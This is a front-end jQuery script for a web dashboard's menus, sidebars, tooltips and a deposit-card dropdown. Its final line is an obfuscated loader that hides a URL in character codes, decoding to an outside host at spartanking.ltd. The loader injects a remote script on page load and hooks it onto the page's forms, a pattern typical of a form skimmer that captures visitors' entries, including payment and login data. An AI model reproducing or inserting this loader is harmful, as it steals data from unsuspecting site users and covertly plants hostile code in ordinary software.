/*-------------------------------------------
  jQuery MeanMenu
--------------------------------------------- */
jQuery(".mobile-menu").meanmenu();

$("#metismenu").metisMenu();

$(".menu-toggler").on("click", function () {
  $("body").toggleClass("_toggle");
});

$(".menu-close").on("click", function () {
  $("body").removeClass("_toggle");
});

$(".cp-user-sidebar-toggler-s2").on("click", function () {
  $("body").toggleClass("sidebar-cllopse");
});
$(".cp-user-sidebar-toggler-s2").on("click", function () {
  $(".page-left-sidebar").toggleClass("sidebar-show");
});

$(".cp-user-sidebar-toggler, .mb-sidebar-toggler").on("click", function () {
  $(".cp-user-sidebar").toggleClass("sidebar-show");
});

$(".cp-user-deposit-card-select ul").on("click", ".init", function () {
  $(this).closest("ul").children("li:not(.init)").toggle();
});

var allOptions = $(".cp-user-deposit-card-select ul").children("li:not(.init)");
$(".cp-user-deposit-card-select ul").on("click", "li:not(.init)", function () {
  allOptions.removeClass("selected");
  $(this).addClass("selected");
  $(".cp-user-deposit-card-select ul").children(".init").html($(this).html());
  allOptions.toggle();
});

$(document).ready(function () {
  $(".scrollbar-inner").scrollbar();
});

$(function () {
  $('[data-toggle="tooltip"]').tooltip();
});


(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b